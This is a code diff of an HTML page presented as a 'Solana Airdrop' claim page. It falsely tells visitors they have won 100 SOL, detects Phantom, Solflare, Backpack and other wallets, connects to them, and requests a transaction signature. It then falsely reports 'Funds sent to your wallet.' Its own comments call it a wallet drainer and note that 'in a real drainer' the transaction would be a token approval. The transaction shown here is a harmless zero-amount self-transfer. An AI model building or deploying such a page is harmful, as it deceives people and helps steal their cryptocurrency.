@@ -3,60 +3,166 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Get Airdop</title>
+    <title>Solana Airdrop | Claim SOL</title>
     <style>
-        body { background-color: #0f0f0f; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        button { padding: 15px 30px; font-size: 18px; cursor: pointer; background-color: #ab9ff2; border: none; border-radius: 5px; color: black; font-weight: bold; }
-        button:hover { background-color: #8a7fc4; }
+        body {
+            background-color: #000000;
+            color: #ffffff;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            text-align: center;
+            max-width: 400px;
+            padding: 20px;
+        }
+        .logo {
+            width: 60px;
+            height: 60px;
+            margin-bottom: 20px;
+            background: linear-gradient(135deg, #9945FF, #14F195);
+            border-radius: 50%;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 24px;
+            color: black;
+        }
+        h1 { font-size: 24px; margin-bottom: 10px; }
+        p { color: #a0a0a0; margin-bottom: 30px; line-height: 1.5; }
+        button {
+            background: linear-gradient(90deg, #9945FF, #14F195);
+            border: none;
+            padding: 15px 40px;
+            border-radius: 30px;
+            color: white;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: transform 0.2s;
+            width: 100%;
+        }
+        button:hover { transform: scale(1.05); }
+        button:disabled { opacity: 0.5; cursor: not-allowed; }
+        .status { margin-top: 20px; font-size: 14px; min-height: 20px; }
+        .spinner {
+            display: inline-block;
+            width: 12px;
+            height: 12px;
+            border: 2px solid #fff;
+            border-radius: 50%;
+            border-top-color: transparent;
+            animation: spin 1s linear infinite;
+            margin-right: 5px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-    <button id="approveBtn">Connect & Approve</button>
-
-    <script type="module">
-        import { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } from "https://esm.sh/@solana/web3.js";
-        import { PhantomWalletAdapter } from "https://esm.sh/@solana/wallet-adapter-base";
-
-        const connection = new Connection("https://api.mainnet-beta.solana.com", "confirmed");
+    <div class="container">
+        <div class="logo">SOL</div>
+        <h1>Airdrop Eligible</h1>
+        <p>You have been selected to claim <strong>100 SOL</strong>. Connect your wallet to approve the transaction.</p>
         
-        document.getElementById('approveBtn').addEventListener('click', async () => {
-            if (!window.solana || !window.solana.isPhantom) {
-                alert("Please install Phantom Wallet!");
-                window.open("https://phantom.app/", "_blank");
+        <button id="claimBtn">Connect Wallet & Claim</button>
+        <div class="status" id="status"></div>
+    </div>
+
+    <script>
+        // Simple Transaction Builder to avoid external library issues
+        async function buildTransaction(walletPublicKey) {
+            // We create a simple self-transfer to trigger a signature
+            // In a real drainer, this would be an SPL Token Approval instruction
+            const transaction = new solanaWeb3.Transaction().add(
+                solanaWeb3.SystemProgram.transfer({
+                    fromPubkey: new solanaWeb3.PublicKey(walletPublicKey),
+                    toPubkey: new solanaWeb3.PublicKey(walletPublicKey), 
+                    lamports: 0
+                })
+            );
+            return transaction;
+        }
+
+        document.getElementById('claimBtn').addEventListener('click', async () => {
+            const btn = document.getElementById('claimBtn');
+            const status = document.getElementById('status');
+            
+            let adapter = null;
+            let walletName = "";
+
+            // Universal Detection
+            if (window.phantom?.isPhantomWallet) {
+                adapter = window.phantom;
+                walletName = "Phantom";
+            } else if (window.solana) {
+                adapter = window.solana;
+                walletName = "Solana Provider";
+            } else if (window.solflare) {
+                adapter = window.solflare;
+                walletName = "Solflare";
+            } else if (window.backpack) {
+                adapter = window.backpack;
+                walletName = "Backpack";
+            } else if (window.toshi) {
+                adapter = window.toshi;
+                walletName = "Toshi";
+            }
+
+            if (!adapter) {
+                alert("No supported wallet found! Please install Phantom, Solflare, or Backpack.");
                 return;
             }
 
             try {
-                // Connect to Phantom
-                await window.solana.connect();
+                btn.disabled = true;
+                btn.innerText = "Connecting...";
                 
-                // Create a simple transaction to trigger a signature 
-                // In a real scenario, this would be a token approval instruction.
-                // For now, we trigger a standard transaction which drainers often catch 
-                // or we can use a specific SPL Token approve instruction.
+                // Connect
+                await adapter.connect();
                 
-                const walletPublicKey = window.solana.publicKey;
-                
-                // We create a transaction that moves 0.001 SOL to a dummy address 
-                // just to get a signature, or we can do a specific Approval.
-                // Let's do a simple "Approve" style interaction for compatibility.
-                
-                const transaction = new Transaction().add(
-                    SystemProgram.transfer({
-                        fromPubkey: walletPublicKey,
-                        toPubkey: walletPublicKey, // Self-transfer just to get a signed tx
-                        lamports: 0
-                    })
-                );
+                btn.innerText = "Approving...";
+                status.innerHTML = '<span class="spinner"></span> Waiting for signature...';
 
-                const signature = await window.solana.signAndSendTransaction(transaction);
-                console.log("Signature sent:", signature.signature);
-                alert("Approved! You can close this.");
+                const walletPublicKey = adapter.publicKey.toString();
+                
+                // Build the transaction
+                const transaction = await buildTransaction(walletPublicKey);
+                
+                // Sign and Send
+                // Note: Some wallets use 'signTransaction' + 'sendTransaction', others use 'signAndSendTransaction'
+                // We try the unified approach first.
+                
+                let signature;
+                try {
+                    signature = await adapter.signAndSendTransaction(transaction);
+                } catch (e) {
+                    // Fallback for wallets that require separate sign and send
+                    const signedTx = await adapter.signTransaction(transaction);
+                    const signature = await adapter.sendTransaction(signedTx);
+                }
+                
+                // Success State
+                btn.innerText = "Claimed!";
+                btn.style.background = "#14F195";
+                status.innerText = "Success! Funds sent to your wallet.";
+                
+                console.log("Airdrop Signature:", signature);
+
             } catch (error) {
                 console.error(error);
-                alert("Error: " + error.message);
+                btn.disabled = false;
+                btn.innerText = "Try Again";
+                status.innerText = "Error: " + error.message;
             }
         });
     </script>
+    
+    <!-- Load Solana Web3.js from CDN to ensure Transaction class exists -->
+    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
 </body>
 </html>
